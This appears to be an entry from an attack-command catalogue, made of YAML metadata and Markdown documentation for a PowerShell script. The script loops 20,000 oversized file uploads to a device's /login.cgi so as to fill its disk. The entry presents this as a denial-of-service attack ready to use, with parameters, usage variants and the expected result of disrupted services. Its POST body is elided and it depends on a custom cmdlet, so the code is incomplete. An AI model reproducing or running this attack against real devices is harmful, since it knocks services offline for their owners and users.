---
data: |-
  $ip = ""
  $content = "A" * 90000

  for ($i=1; $i -le 20000; $i++)
  {
  $POST = "[full POST body as above]"
  echo $POST | Send-NetworkData -Computer 10.62.148.4 -Port 80
  }
tags:
  - dos
  - automation
  - loop-upload
type: command
executor: powershell
platforms:
  - Windows
id: d7db7ee6-0ceb-472c-a5ef-e00e937b400d
created_at: '2025-12-14T05:32:10.003Z'
updated_at: '2025-12-14T05:32:10.003Z'
verified: false
validated: true
submitted: true
---
# PowerShell-Script-for-Mass-File-Upload-DoS

## Command

```powershell
$ip = "10.62.148.4"
$content = "A" * 90000
for ($i=1; $i -le 20000; $i++) {
    $POST = "POST http://$ip/login.cgi HTTP/1.1`n... (full multipart body with $i.txt and $content)"
    echo $POST | Send-NetworkData -Computer $ip -Port 80
}
```

## Description

PowerShell script that automates 20,000 file uploads to exhaust disk space on the target device via repeated POSTs to /login.cgi.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $ip | Target IP (e.g., 10.62.148.4) | Yes |
| $content | Large string ('A' x 90000) for file size | Yes |
| $i | Loop variable (1-20000) for filename | Internal |
| Send-NetworkData | Custom cmdlet with -Computer, -Port, -Data | Yes |

## Examples

### Basic Usage

```powershell
# Set $ip and run the for loop
```

### Advanced Usage

```powershell
# Adjust loop count to 1000 for testing
for ($i=1; $i -le 1000; $i++) { ... }
```

## Expected Output

Console output of server responses for each upload; after completion, device disk full, services disrupted.

## Related

- [[commands/send-networkdata-tcp-function]]
- [[procedures/upload-multiple-files-to-exhaust-disk-space]]
